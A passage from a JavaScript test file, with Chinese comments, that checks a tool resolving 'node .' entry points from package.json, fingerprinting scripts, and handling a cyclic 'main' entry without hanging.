    writeFileSync(join(d, 'package.json'), JSON.stringify({ main: 'nowhere/at/all' }), 'utf8');
    const refs = analyzeCommandRefs('node .', d);
    expect(refs.files).toEqual([]);
    expect(refs.unresolved).toEqual(['.']);
    // 而且这个「没锁住」的事实本身进指纹：入口从「定位不到」变成「能定位」时指纹要变
    const before = scriptsFingerprint({ 'check:boot': 'node .' }, d);
    writeFileSync(join(d, 'index.js'), '1', 'utf8');
    expect(scriptsFingerprint({ 'check:boot': 'node .' }, d)).not.toBe(before);
    expect(analyzeCommandRefs('node .', d).unresolved).toEqual([]);
  });

  it('入口声明是环也不会卡死（递归有深度上限）', () => {
    const d = mkdtempSync(join(tmpdir(), 'bootcheck-cycle-'));
    tmpDirs.push(d);
    writeFileSync(join(d, 'package.json'), JSON.stringify({ main: '.' }), 'utf8');
    expect(() => referencedRepoFiles('node .', d)).not.toThrow();
    expect(referencedRepoFiles('node .', d)).toEqual([]);
  });
});
